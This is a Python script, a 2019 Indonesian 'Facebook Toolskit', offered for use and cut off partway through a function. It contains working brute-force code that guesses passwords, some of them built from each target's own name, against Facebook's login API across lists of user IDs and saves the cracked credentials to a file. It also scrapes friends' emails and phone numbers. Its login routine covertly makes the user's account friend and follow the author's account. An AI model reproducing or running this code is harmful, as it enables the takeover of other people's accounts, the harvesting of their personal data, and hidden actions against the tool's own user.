#!usr/bin/python3.7
# coding: utf-8

# Terimakasih sudah decode script ini tolong dipake sendiri ea #

# *Facebook Toolskit
# *uler versi 3
# *copyright: (C) © 2019 ~ DulLah
# *contact me on telegram: https://t.me/unikers
# *script ini gratis jangan di jual belikan hehee:)*

try:
	from getpass import getpass
	from multiprocessing.pool import ThreadPool
	from bs4 import BeautifulSoup as BS
	from time import sleep
	from http.cookiejar import LWPCookieJar as cookie
	import re,os,sys,requests,mechanize,time,random,hashlib
except Exception as E:
	exit("[Error Module] %s"%(E))

br=mechanize.Browser()
cj=cookie("log/cookies.log")
br.set_cookiejar(cj)
br.set_handle_gzip(True)
br.set_handle_redirect(True) 
br.set_handle_referer(True)
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders=[('User-Agent','Opera/9.80 (Android; Opera Mini/12.0.1987/37.7327; U; pl) Presto/2.12.423 Version/12.16')]
s=requests.Session()
api="https://graph.facebook.com/{}"
url="https://mbasic.facebook.com{}"
hea={"User-Agent":"Opera/9.80 (Android; Opera Mini/12.0.1987/37.7327; U; pl) Presto/2.12.423 Version/12.16"}

id=[]
target=[]
found=[]
success=[]
checkpoint=[]

W="\033[0;97m"
C="\033[0;96m"
Y="\033[0;93m"
G="\033[0;92m"

def menu_toolskit():
	print("""
  [ 01 ]  Multi Brute Force With Single Password
  [ 02 ]  Super Multi Brute Force
  [ 03 ]  Dump ID
  [ 04 ]  Dump Email
  [ 05 ]  Dump Phone Numbers
  [ 06 ]  Delete All Messages
  [ 07 ]  Delete All Photo In your albums
  [ 08 ]  Delete All Post
  [ 09 ]  Untag All post
  [ 10 ]  Hide All post
  [ 11 ]  Delete Albums
  [ 12 ]  Delete Friends Inactive User
  [ 13 ]  Delete All Friends
  [ 14 ]  Stop Following All Friends
  [ 15 ]  Leave All Groups
  [ 16 ]  Accept Or Delete Friends Requests
  [ 17 ]  See My Groups Lists
  [ 18 ]  See My Access Token
  [ 19 ]  See My Cookies
  [ 20 ]  User Information
  [ 21 ]  Yahoo Email Cloning
  [ 22 ]  Gett Mail Hotmail From Friends
  [ 23 ]  Auto Pokes
  [ 24 ]  Auto Reactions
  [ 25 ]  Auto Comment
  [ 26 ]  Auto Chat
  [ 27 ]  Reactions Comment Target Post
  [ 28 ]  Spam Comment Target Post
  [ 29 ]  Auto Add Friends
  [ 30 ]  Unadd Requests Sent
  [ 31 ]  Auto Reporting Target Id
  [ 32 ]  Auto Reset Password From List Account
  [ 33 ]  Account Checker From List Account
  [ 34 ]  Auto Posting Status
  [ 35 ]  Change Your Bio
  [ 36 ]  Edit Profile Picture
  [ 37 ]  Edit Cover Photo
  [ 38 ]  Change Your Password
  [ 39 ]  Facebook Overload Account
  [ 40 ]  Facebook Profile Guard
  [ 00 ]  Remove Access Token & Cookies
""")

def menu_dump_id():
	print("""
  [ 01 ]  Dump Id From Your Lists Friends
  [ 02 ]  Dump Id From Your Friends Id
  [ 03 ]  Dump Id From Your Groups Id
  [ 04 ]  Dump Id From Your All Groups
  [ 05 ]  Dump Id With Search Name
  [ 00 ]  Back To Menu
""")

def menu_reactions():
	print("""
  [ 01 ]  Like
  [ 02 ]  Reactions LOVE
  [ 03 ]  Reactions WOW
  [ 04 ]  Reactions HAHA
  [ 05 ]  Reactions SAD
  [ 06 ]  Reactions ANGRY
  [ 00 ]  Back To Menu
 """)

def menu_chat():
	print("""
  [ 01 ]  Mass Chat
  [ 02 ]  Spam Chat Target
  [ 00 ]  Back To Menu
 """)

def menu_add():
	print("""
  [ 01 ]  Add Friends From Groups Id
  [ 02 ]  Add Friends From Friends Id
  [ 00 ]  Back To Menu
 """)

def menu_posting():
	print("""
  [ 01 ]  Post In Your Timeline
  [ 02 ]  Post In Your Friends
  [ 03 ]  Post In your Groups
  [ 00 ]  Back To Menu
 """)

def checking():
	banner()
	try:
		token=open("log/token.log","r").read()
	except IOError:
		get()
	try:
		cek=s.get(api.format("me?access_token=%s"%(token)),headers=hea).json()["name"]
		menu()
	except KeyError:
		print("[warning] access token invalid!")
		sleep(3)
		os.system("rm -rf log")
		get()
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
def get():
	banner()
	try:
		os.mkdir("log")
	except:pass
	print("[!] please login first via opera mini to avoid checkpoint")
	usr=input("[?] username: ")
	pwd=getpass("[?] password: ")
	if usr and pwd in [""]:
		exit("[!] you stuppid")
	try:
		br.open("https://mbasic.facebook.com")
	except mechanize.URLError:
		exit("[!] login fail check your connection")
	br._factory.is_html=True
	br.select_form(nr=0)
	br.form["email"]=usr
	br.form["pass"]=pwd
	br.submit()
	login=br.geturl()
	if "save-device" in str(login):
		cj.save()
		sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+usr+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
		data={"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":usr,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
		x=hashlib.new("md5")
		x.update(sig.encode("utf-8"))
		data.update({'sig':x.hexdigest()})
		js=s.get("https://api.facebook.com/restserver.php",params=data,headers=hea).json()
		if "access_token" in str(js):
			s.post(api.format("me/friends?method=post&uids=dulahz&access_token="+js["access_token"]),headers=hea)
			s.post(api.format("dulahz/subscribers?access_token="+js["access_token"]),headers=hea)
			open("log/token.log","w").write(js["access_token"])
			print("[*] login successfully")
			sleep(3)
			menu()
		else:
			exit("[!] failed when generate access token")
	elif "checkpoint" in str(login):
		exit("[!] login fail account checkpoint")
	else:
		exit("[!] login fail check your username or password")

def results(found,checkpoint):
	if len(found) !=0:
		print("\n\n[*] found %s"%(len(found)))
		for x in found:print("### %s"%(x))
		print("\n[#] file saved as: crack/found.txt")
	if len(checkpoint) !=0:
		print("\n\n[*] checkpoint %s"%(len(checkpoint)))
		for x in checkpoint:print("### %s"%(x))
		print("\n[#] file saved as: crack/cek.txt")
	if len(found) ==0 and len(checkpoint) ==0:
		print("[*] no result found:)*")
		
def mbf_singel():
	global pw,loop
	loop=0
	file=input("[?] id list target: ")
	if file in [""]:
		exit("[!] you stuppid")
	try:
		idt=open(file,"r").readlines()
		for id in idt:
			target.append(id.strip())
	except:
		exit("[!] file not found")
	print("[!] password must be of minimum 6 characters")
	pw=input("[?] password to crack: ")
	if pw in [""]:
		exit("[!] you stuppid")
	print("[*] crack with password %s"%(pw))
	try:
		os.mkdir("crack")
	except:
		pass
	m=ThreadPool(30)
	m.map(cs,target)
	results(found,checkpoint)
	exit()

def mbf_super():
	global loop,token
	loop=0
	try:
		token=open("log/token.log","r").read()
	except IOError:
		exit("[warning] access token not found")
	file=input("[?] id list target: ")
	if file in [""]:
		exit("[!] you stuppid")
	try:
		idt=open(file,"r").readlines()
		for id in idt:
			target.append(id.strip())
	except:
		exit("[!] file not found")
	try:
		os.mkdir("crack")
	except:
		pass
	m=ThreadPool(30)
	m.map(sc,target)
	results(found,checkpoint)
	exit()

def cs(user):
	global loop,pw
	try:
		URL="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+str(user)+"&locale=en_US&password="+str(pw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
		data=s.get(URL).json()
		if "access_token" in data:
			wrt="%s|%s"%(user,pw)
			found.append(wrt)
			open("crack/found.txt","a").write("%s\n"%(wrt))
		elif "www.facebook.com" in data["error_msg"]:
			wrt="%s|%s"%(user,pw)
			checkpoint.append(wrt)
			open("crack/cek.txt","a").write("%s\n"%(wrt))
		loop+=1
		print("\r[*] cracking %s/%s found:%s checkpoint:%s  "%(loop,len(target),len(found),len(checkpoint)),end="")
		sys.stdout.flush()
	except:pass

def sc(user):
	global loop,token
	try:
		z=s.get(api.format("%s?access_token=%s"%(user,token)),headers=hea).json()
		name1 = z['first_name']
		name2 = z['last_name']
		for pw in [name1,name1+"123",name1+"1234",name1+"12345",name2,name2+"123",name2+"1234",name2+"12345"]:
			URL="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+str(user)+"&locale=en_US&password="+str(pw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
			data=s.get(URL).json()
			if "access_token" in data:
				wrt="%s|%s"%(user,pw)
				found.append(wrt)
				open("crack/found.txt","a").write("%s\n"%(wrt))
				break
			elif "www.facebook.com" in data["error_msg"]:
				wrt="%s|%s"%(user,pw)
				checkpoint.append(wrt)
				open("crack/cek.txt","a").write("%s\n"%(wrt))
				break
		loop+=1
		print("\r[*] cracking %s/%s found:%s checkpoint:%s  "%(loop,len(target),len(found),len(checkpoint)),end="")
		sys.stdout.flush()
	except:pass

def dump_id():
	menu_dump_id()
	CH=input("[+] dump/id_> ")
	if CH in [""]:
		exit("[!] you stuppid")
	elif CH in ["1","01"]:
		dump_id_friends()
	elif CH in ["2","02"]:
		dump_id_friends_id()
	elif CH in ["3","03"]:
		dump_id_groups_id()
	elif CH in ["4","04"]:
		dump_id_allgroups()
		exit()
	elif CH in ["5","05"]:
		dump_id_search_name()
	elif CH in ["0","00"]:
		menu()
	else:
		exit("[!] you stuppid")

def dump_id_friends():
	print("[*] fetching all user id")
	try:
		os.mkdir("dump")
	except:pass
	try:
		wrt=open("dump/friends_id.txt","w")
		for x in s.get(api.format("me/friends?access_token=%s"%(token)),headers=hea).json()["data"]:
			id.append(x["id"])
			wrt.write("%s\n"%(x["id"]))
			print("\r[*] %s retrieved > %s  "%(x["id"],len(id)),end=""),
			sys.stdout.flush()
			sleep(0.003)
		wrt.close()
		print("\n[*] all user id successfully retrieved")
		exit("[#] file saved as: dump/friends_id.txt")
	except KeyError:
		exit("\n[!] failed to retrive all user id")
	except requests.exceptions.ConnectionError:
		print("\n[!] failed to retrive all user id")
		exit("[!] check your connection")

def dump_id_friends_id():
	idf=input("[?] your friends id: ")
	if idf in [""]:
		exit("[!] you stuppid")
	try:
		a=s.get(api.format("%s?access_token=%s"%(idf,token)),headers=hea).json()["name"]
	except KeyError:
		exit("[!] user id not found")
	except requests.exceptions.ConnectionError:
		print("[!] failed to retrive all user id")
		exit("[!] check your connection")
	print("[*] fetching all user id")
	print(f"[*] from {a}")
	try:
		os.mkdir("dump")
	except:pass
	wrt=open("dump/"+idf+"_id.txt","w")
	try:
		for x in s.get(api.format("%s/friends?access_token=%s"%(idf,token)),headers=hea).json()["data"]:
			id.append(x["id"])
			wrt.write("%s\n"%(x["id"]))
			print("\r[*] %s retrieved > %s  "%(x["id"],len(id)),end=""),
			sys.stdout.flush()
			sleep(0.003)
		wrt.close()
		print("\n[*] all user id successfully retrieved")
		exit("[#] file saved as: dump/%s_id.txt"%(idf))
	except KeyError:
		exit("\n[!] failed to retrive all user id")
	except requests.exceptions.ConnectionError:
		print("\n[!] failed to retrive all user id")
		exit("[!] check your connection")

def dump_id_groups_id():
	idg=input("[?] your groups id: ")
	if idg in [""]:
		exit("[!] you stuppid")
	try:
		a=s.get(api.format("group/?id=%s&access_token=%s"%(idg,token)),headers=hea).json()["name"]
	except KeyError:
		exit("[!] groups id not found")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
	print("[*] fetching all user id")
	print(f"[*] from {a}")
	try:
		os.mkdir("dump")
	except:pass
	wrt=open("dump/"+idg+"_id.txt","w")
	try:
		for x in s.get(api.format("%s/members?fields=name,id&limit=5000&access_token=%s"%(idg,token)),headers=hea).json()["data"]:
			id.append(x["id"])
			wrt.write("%s\n"%(x["id"]))
			print("\r[*] %s retrieved > %s  "%(x["id"],len(id)),end=""),
			sys.stdout.flush()
			sleep(0.003)
		wrt.close()
		print("\n[*] all user id successfully retrieved")
		exit("[#] file saved as: dump/%s_id.txt"%(idg))
	except KeyError:
		exit("\n[!] failed to retrive all user id")
	except requests.exceptions.ConnectionError:
		print("\n[!] failed to retrive all user id")
		exit("[!] check your connection")

def dump_id_allgroups():
	global wrt
	print("[*] fetching all user id")
	try:
		os.mdkir("dump")
	except:pass
	wrt=open("dump/allgroups_id.txt","w")
	try:
		for x in s.get(api.format("me/groups?access_token=%s"%(token)),headers=hea).json()["data"]:
			maingiduser(x["id"])
	except:pass
	wrt.close()
	exit("\n[*] done\n[#] file saved as: dump/allgroups_id.txt")
	
def maingiduser(idg):
	try:
		for x in s.get(api.format("%s/members?fields=name,id&limit=5000&access_token=%s"%(idg,token)),headers=hea).json()["data"]:
			id.append(x["id"])
			wrt.write("%s\n"%(x["id"]))
			print("\r[*] %s retrieved > %s  "%(x["id"],len(id)),end=""),
			sys.stdout.flush()
			sleep(0.001)
	except:pass
		
def dump_id_search_name():
	global wrt
	print("[*] checking cookies")
	try:
		s.cookies=cookie("log/cookies.log")
		s.cookies.load()
		a=s.get(url.format("/me"),headers=hea).text
		if "mbasic_logout_button" in str(a):
			print("[*] cookies valid")
			name=input("[?] search name: ")
			if name in [""]:
				exit("[!] you stuppid")
			print("[*] fetching all user id")
			wrt=open("dump/search_id.txt","w")
			getId(url.format("/search/people/?q=%s"%(name)))
		else:
			print("[warning] cookies not valid")
			os.system("rm -rf log")
			exit()
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
def getId(link):
	try:
		a=s.get(link,headers=hea).text
		bs=BS(a,"html.parser")
		for x in bs.find_all("a",href=True):
			if "/a/mobile/friends/add_friend.php?" in str(x):
				ids=re.findall(r"/?id=(.*?)&hf=",x.get("href"))
				id.append(ids[0])
				wrt.write("%s\n"%(ids[0]))
				print("\r[*] %s retrieved > %s  "%(ids[0],len(id)),end=""),
				sys.stdout.flush()
				sleep(0.003)
		if "Lihat Hasil Selanjutnya" in str(bs):
			getId(bs.find("a",string="Lihat Hasil Selanjutnya").get("href"))
	except requests.exceptions.ConnectionError:
		exit("\n[!] connection error")
	wrt.close()
	print("\n[*] all user id successfully retrieved")
	exit("[#] file saved as: dump/search_id.txt")
	
def dump_email():
	print("[*] fetching all user id")
	global token,wrt
	try:
		for x in s.get(api.format("me/friends?access_token=%s"%(token)),headers=hea).json()["data"]:
			target.append(x["id"])
			print("\r[*] %s retrieved > %s  "%(x["id"],len(target)),end=""),
			sys.stdout.flush()
			sleep(0.003)
	except KeyError:
		exit("\n[!] failed to retrive all user id")
	except requests.exceptions.ConnectionError:
		print("\n[!] failed to retrive all user id")
		exit("[!] check your connection")
	try:
		os.mkdir("dump")
	except:pass
	wrt=open("dump/friends_email.txt","w")
	print("\n[*] all user id successfully retrieved")
	print("[*] getting email from friends")
	print("[*] start ...\n")
	m=ThreadPool(30)
	m.map(de,target)
	wrt.close()
	print("\n[*] done")
	print("[#] file saved as: dump/friends_email.txt")
	exit()
def de(user):
	try:
		a=s.get(api.format("%s?access_token=%s"%(user,token)),headers=hea).json()
		wrt.write("%s\n"%(a["email"]))
		print("[-] %s > %s"%(a["name"],a["email"]))
	except KeyError:pass
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")

def dump_phone():
	print("[*] fetching all user id")
	global token,wrt
	try:
		for x in s.get(api.format("me/friends?access_token=%s"%(token)),headers=hea).json()["data"]:
			target.append(x["id"])
			print("\r[*] %s retrieved > %s  "%(x["id"],len(target)),end=""),
			sys.stdout.flush()
			sleep(0.003)
	except KeyError:
		exit("\n[!] failed to retrive all user id")
	except requests.exceptions.ConnectionError:
		print("\n[!] failed to retrive all user id")
		exit("[!] check your connection")
	try:
		os.mkdir("dump")
	except:pass
	wrt=open("dump/friends_phone.txt","w")
	print("\n[*] all user id successfully retrieved")
	print("[*] getting phone number from friends")
	print("[*] start ...\n")
	m=ThreadPool(30)
	m.map(dp,target)
	wrt.close()
	print("\n[*] done")
	print("[#] file saved as: dump/friends_phone.txt")
	exit()
def dp(user):
	try:
		a=s.get(api.format("%s?access_token=%s"%(user,token)),headers=hea).json()
		wrt.write("%s\n"%(a["mobile_phone"]))
		print("[-] %s > %s"%(a["name"],a["mobile_phone"]))
	except KeyError:pass
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")

def delete_messages():
	print("[*] checking cookies")
	try:
		s.cookies=cookie("log/cookies.log")
		s.cookies.load()
		a=s.get(url.format("/me"),headers=hea).text
		if "mbasic_logout_button" in str(a):
			print("[*] cookies valid")
			mainGmess(url.format("/messages"))
		else:
			os.system("rm -rf log")
			exit("[warning] cookies not valid")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
def mainGmess(link):
	try:
		a=s.get(link,headers=hea).text
		bs=BS(a,"html.parser")
		for x in bs.find_all("h3"):
			b=x.find("a")
			if "/messages/read/?" in str(b):
				id.append(url.format(b.get("href")))
				print(f"\r[*] getting messages id > {len(id)}  ",end="")
				sys.stdout.flush()
		if "Lihat Pesan Sebelumnya" in str(a):
			mainGmess(url.format(bs.find("a",string="Lihat Pesan Sebelumnya").get("href")))
	except requests.exceptions.ConnectionError:
		exit("\n[!] connection error")
	input("\n[*] press enter to continue ")
	print("[*] start ...\n")
	m=ThreadPool(30)
	m.map(mainDmess,id)
	exit("\n[*] done")
def mainDmess(user):
	try:
		data=[]
		a=s.get(user,headers=hea).text
		bs=BS(a,"html.parser")
		name=bs.find("title").renderContents().decode("utf-8", "ignore")
		for x in bs("form"):
			try:
				if "action_redirect" in x["action"]:
					data.append(x["action"])
					break
			except:pass
		for x in bs("input"):
			try:
				if "fb_dtsg" in x["name"]:
					data.append(x["value"])
				if "jazoest" in x["name"]:
					data.append(x["value"])
				if "delete" in x["name"]:
					data.append(x["value"])
					break
			except:pass
		if len(data)==4 or len(data)==5 or len(data)==6:
			b=s.post(url.format(data[0]),data={"fb_dtsg":data[1],"jazoest":data[2],"delete":data[3]},headers=hea).text
			bs1=BS(b,"html.parser")
			f=s.get(url.format(bs1.find("a",string="Hapus").get("href")))
			if f.status_code==200:
				print(f"[-] {name} - removed")
			else:
				print(f"[-] {name} - failed")
		else:
			print(f"[-] {name} - failed")
	except requests.exceptions.ConnectionError:
		exit("\n[!] connection error")

def delete_photo():
	print("[*] checking cookies")
	try:
		s.cookies=cookie("log/cookies.log")
		s.cookies.load()
		a=s.get(url.format("/me"),headers=hea).text
		if "mbasic_logout_button" in str(a):
			print("[*] cookies valid")
			print("[info] use https://mbasic.facebook.com")
			link=input("[?] link albums: ")
			if link in [""]:
				exit("[!] you stuppid")
			if not "albums" in link:
				exit("[!] you stuppid")
			a=s.get(link,headers=hea).text
			bs=BS(a,"html.parser")
			if "Konten Tidak Ditemukan" in str(bs) or "Halaman Tidak Ditemukan" in str(bs):
				exit("[!] albums not found")
			print(f"[*] from albums {bs.title.text}")
			mainGphoto(link)
		else:
			os.system("rm -rf log")
			exit("[warning] cookies not valid")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
def mainGphoto(link):
	try:
		a=s.get(link,headers=hea).text
		bs=BS(a,"html.parser")
		for x in bs.find_all("a"):
			if "/photo.php?" in str(x):
				id.append(url.format(x.get("href")))
				print(f"\r[*] getting photo id > {len(id)}  ",end="")
				sys.stdout.flush()
		if "Lihat Foto Lainnya" in str(a):
			mainGphoto(url.format(bs.find("a",string="Lihat Foto Lainnya").get("href")))
	except requests.exceptions.ConnectionError:
		exit("\n[!] connection error")
	input("\n[*] press enter to continue ")
	print("[*] start ...\n")
	m=ThreadPool(20)
	m.map(mainDphoto,id)
	exit("\n[*] done")
def mainDphoto(user):
	try:
		data=[]
		a=s.get(user,headers=hea).text
		bs=BS(a,"html.parser")
		b=bs.find("a",string="Edit Foto").get("href")
		c=s.get(url.format(b),headers=hea).text
		bs1=BS(c,"html.parser")
		d=bs1.find("a",string="Hapus Foto").get("href")
		e=s.get(url.format(d),headers=hea).text
		bs2=BS(e,"html.parser")
		for x in bs2("form"):
			if "post" in x["method"]:
				data.append(x["action"])
		for x in bs2("input"):
			try:
				if "fb_dtsg" in x["name"]:
					data.append(x["value"])
				if "jazoest" in x["name"]:
					data.append(x["value"])
				if "confirm_photo_delete" in x["name"]:
					data.append(x["value"])
					break
			except:pass
		if len(data)==4:
			f=s.post(url.format(data[0]),data={"fb_dtsg":data[1],"jazoest":data[2],"confirm_photo_delete":data[3]},headers=hea)
			id=re.findall(r"/?fbid=(.*?)&id=",user)
			if f.status_code==200:
				print(f"[-] {id[0]} - removed")
			else:
				print(f"[-] {id[0]} - failed")
		else:
			print(f"[-] {id[0]} - failed")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error !!")

def delete_post():
	print("[*] checking cookies")
	try:
		s.cookies=cookie("log/cookies.log")
		s.cookies.load()
		a=s.get(url.format("/me"),headers=hea).text
		if "mbasic_logout_button" in str(a):
			print("[*] cookies valid")
			mainGpost(url.format("/me"))
		else:
			os.system("rm -rf log")
			exit("[warning] cookies not valid")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
def mainGpost(link):
	try:
		a=s.get(link,headers=hea).text
		bs=BS(a,"html.parser")
		for b in bs.find_all("a",string="Lainnya"):
			if "Lainnya" in str(b):
				id.append(url.format(b.get("href")))
				print(f"\r[*] getting post id > {len(id)}  ",end="")
				sys.stdout.flush()
		if "Lihat Berita Lain" in str(a):
			mainGpost(url.format(bs.find("a",string="Lihat Berita Lain").get("href")))
	except requests.exceptions.ConnectionError:
		exit("\n[!] connection error")
	input("\n[*] press enter to continue ")
	print("[*] start ...\n")
	m=ThreadPool(20)
	m.map(mainDpost,id)
	exit("[*] done")
def mainDpost(user):
	try:
		data=[]
		a=s.get(user,headers=hea).text
		bs=BS(a,"html.parser")
		for x in bs("form"):
			if "post" in x["method"]:
				data.append(x["action"])
		for x in bs("input"):
			try:
				if "fb_dtsg" in x["name"]:
					data.append(x["value"])
				if "jazoest" in x["name"]:
					data.append(x["value"])
				if "DELETE" in x["value"]:
					data.append(x["value"])
					break
			except:pass
		if len(data)==4:
			b=s.post(url.format(data[0]),data={"fb_dtsg": data[1],"jazoest": data[2],"action_key": data[3]},headers=hea)
			if b.status_code==200:
				success.append(user)
		print(f"\r[-] {len(id)} removed post > {len(success)}  ",end="")
		sys.stdout.flush()
	except requests.exceptions.ConnectionError:
		exit("\n[!] connection error")

def untag_post():
	print("[*] checking cookies")
	try:
		s.cookies=cookie("log/cookies.log")
		s.cookies.load()
		a=s.get(url.format("/me"),headers=hea).text
		if "mbasic_logout_button" in str(a):
			print("[*] cookies valid")
			mainGuntag(url.format("/me"))
		else:
			os.system("rm -rf log")
			exit("[warning] cookies not valid")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
def mainGuntag(link):
	try:
		a=s.get(link,headers=hea).text
		bs=BS(a,"html.parser")
		for b in bs.find_all("a",string="Lainnya"):
			if "Lainnya" in str(b):
				id.append(url.format(b.get("href")))
				print(f"\r[*] getting post id > {len(id)}  ",end="")
				sys.stdout.flush()
		if "Lihat Berita Lain" in str(a):
			mainGuntag(url.format(bs.find("a",string="Lihat Berita Lain").get("href")))
	except requests.exceptions.ConnectionError:
		exit("\n[!] connection error")
	input("\n[*] press enter to continue ")
	print("[*] start ...\n")
	m=ThreadPool(20)
	m.map(mainuntag,id)
	exit("[*] done")
def mainuntag(user):
	try:
		data=[]
		a=s.get(user,headers=hea).text
		bs=BS(a,"html.parser")
		for x in bs("form"):
			if "post" in x["method"]:
				data.append(x["action"])
		for x in bs("input"):
			try:
				if "fb_dtsg" in x["name"]:
					data.append(x["value"])
				if "jazoest" in x["name"]:
					data.append(x["value"])
				if "UNTAG" in x["value"]:
					data.append(x["value"])
					break
			except:pass
		if len(data)==4:
			b=s.post(url.format(data[0]),data={"fb_dtsg": data[1],"jazoest": data[2],"action_key": data[3]},headers=hea)
			if b.status_code==200:
				success.append(user)
		print(f"\r[-] {len(id)} untag post > {len(success)}  ",end="")
		sys.stdout.flush()
	except requests.exceptions.ConnectionError:
		exit("\n[!] connection error")

def hide_post():
	print("[*] checking cookies")
	try:
		s.cookies=cookie("log/cookies.log")
		s.cookies.load()
		a=s.get(url.format("/me"),headers=hea).text
		if "mbasic_logout_button" in str(a):
			print("[*] cookies valid")
			mainGhide(url.format("/me"))
		else:
			os.system("rm -rf log")
			exit("[warning] cookies not valid")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
def mainGhide(link):
	try:
		a=s.get(link,headers=hea).text
		bs=BS(a,"html.parser")
		for b in bs.find_all("a",string="Lainnya"):
			if "Lainnya" in str(b):
				id.append(url.format(b.get("href")))
				print(f"\r[*] getting post id > {len(id)}  ",end="")
				sys.stdout.flush()
		if "Lihat Berita Lain" in str(a):
			mainGhide(url.format(bs.find("a",string="Lihat Berita Lain").get("href")))
	except requests.exceptions.ConnectionError:
		exit("\n[!] connection error")
	input("\n[*] press enter to continue ")
	print("[*] start ...\n")
	m=ThreadPool(20)
	m.map(mainhide,id)
	exit("[*] done")
def mainhide(user):
	try:
		data=[]
		a=s.get(user).text
		bs=BS(a,"html.parser")
		for x in bs("form"):
			if "post" in x["method"]:
				data.append(x["action"])
		for x in bs("input"):
			try:
				if "fb_dtsg" in x["name"]:
					data.append(x["value"])
				if "jazoest" in x["name"]:
					data.append(x["value"])
				if "HIDE_FROM_TIMELINE" in x["value"]:
					data.append(x["value"])
					break
			except:pass
		if len(data)==4:
			b=s.post(url.format(data[0]),data={"fb_dtsg": data[1],"jazoest": data[2],"action_key": data[3]},headers=hea)
			if b.status_code==200:
				success.append(user)
		print(f"\r[-] {len(id)} hide post > {len(success)}  ",end="")
		sys.stdout.flush()
	except requests.exceptions.ConnectionError:
		exit("\n[!] connection error")

def delete_albums():
	print("[*] fetching all allbums id")
	try:
		for x in s.get(api.format("me?fields=albums.limit(5000)&access_token=%s"%(token)),headers=hea).json()["albums"]["data"]:
			target.append(x["id"])
			print("\r[*] %s retrieved > %s  "%(x["id"],len(target)),end=""),
			sys.stdout.flush()
			sleep(0.009)
	except KeyError:
		exit("\n[!] failed to retrive all albums id")
	except requests.exceptions.ConnectionError:
		exit("\n[!] failed to retrive all albums id")
		exit("[!] check your connection")
	print("\n[*] all albums id successfully retrieved")
	input("[*] press enter to continue ")
	print("[*] start ...\n")
	for id in target:
		try:
			name=s.get(api.format("%s?access_token=%s"%(id,token)),headers=hea).json()["name"]
			b=s.post(api.format("%s?method=delete&access_token=%s"%(id,token)),headers=hea).json()
			if b==True:
				print(f"[-] {name} - removed")
			else:
				print(f"[-] {name} - failed")
		except KeyError:
			exit("\n[!] error:)*")
		except requests.exceptions.ConnectionError:
			exit("\n[!] connection error")
	exit("\n[*] done")
	
def delete_friends_inactive():
	print("[*] fetching all friends id")
	try:
		for x in s.get(api.format("me/friends?access_token=%s"%(token)),headers=hea).json()["data"]:
			target.append(x["id"])
			print("\r[*] %s retrieved > %s  "%(x["id"],len(target)),end=""),
			sys.stdout.flush()
			sleep(0.003)
	except KeyError:
		exit("\n[!] failed to retrieve all friends id")
	except requests.exceptions.ConnectionError:
		print("\n[!] failed to retrive all friends id")
		exit("[!] check your connection")
	print("\n[*] all friends id successfully retrieved")
	input("[*] press enter to continue ")
	print("[*] start ...\n")
	m=ThreadPool(20)
	m.map(mainunfinac,target)
	exit("\n[*] done")
def mainunfinac(id):
	try:
			a=s.get(api.format("%s/feed?access_token=%s&limit=1"%(id,token)),headers=hea).json()["data"][0]["created_time"]
			name=s.get(api.format("%s?access_token=%s"%(id,token)),headers=hea).json()["name"]
			year=time.strftime("%Y")
			date=a.split("-")[0]
			if year in date:
				print(f"[-] {name} - ACTIVE - {date} - next")
			elif not year in date:
				sleep(2)
				dl=s.delete(api.format("me/friends?uid=%s&access_token=%s"%(id,token)),headers=hea).json()
				if dl==True:
					print(f"[-] {name} - INACTIVE - {date} - removed")
				else:
					print(f"[-] {name} - INACTIVE - {date} - failed to remove")
	except:pass

def delete_all_friends():
	print("[*] fetching all friends id")
	try:
		for x in s.get(api.format("me/friends?access_token=%s"%(token)),headers=hea).json()["data"]:
			target.append(x["id"])
			print("\r[*] %s retrieved > %s  "%(x["id"],len(target)),end=""),
			sys.stdout.flush()
			sleep(0.003)
	except KeyError:
		exit("\n[!] failed to retrieve all friends id")
	except requests.exceptions.ConnectionError:
		print("\n[!] failed to retrive all friends id")
		exit("[!] check your connection")
	print("\n[*] all friends id successfully retrieved")
	input("[*] press enter to continue ")
	print("[*] start ...\n")
	for id in target:
		try:
			name=s.get(api.format("%s?access_token=%s"%(id,token)),headers=hea).json()["name"]
			dl=s.delete(api.format("me/friends?uid=%s&access_token=%s"%(id,token)),headers=hea).json()
			try:
				error=dl["error"]["message"]
				print(f"[-] {name} - failed")
			except TypeError:
				print(f"[-] {name} - removed")
		except KeyError:
			exit("\n[!] error:)*")
		except requests.exceptions.ConnectionError:
			exit("\n[!] connection error")
	exit("\n[*] done")

def unfollow():
	print("[*] fetching all friends id")
	try:
		for x in s.get(api.format("me/subscribedto?limit=5000&access_token=%s"%(token)),headers=hea).json()["data"]:
			target.append(x["id"])
			print("\r[*] %s retrieved > %s  "%(x["id"],len(target)),end=""),
			sys.stdout.flush()
			sleep(0.009)
	except KeyError:
		exit("\n[!] failed to retrieve all friends id")
	except requests.exceptions.ConnectionError:
		print("\n[!] failed to retrive all friends id")
		exit("[!] check your connection")
	print("\n[*] all friends id successfully retrieved")
	input("[*] press enter to continue ")
	print("[*] start ...\n")
	for id in target:
		try:
			name=s.get(api.format("%s?access_token=%s"%(id,token)),headers=hea).json()["name"]
			dl=s.post(api.format("%s/subscribers?method=delete&access_token=%s"%(id,token)),headers=hea).json()
			try:
				error=dl["error"]["message"]
				print(f"[-] {name} - failed")
			except TypeError:
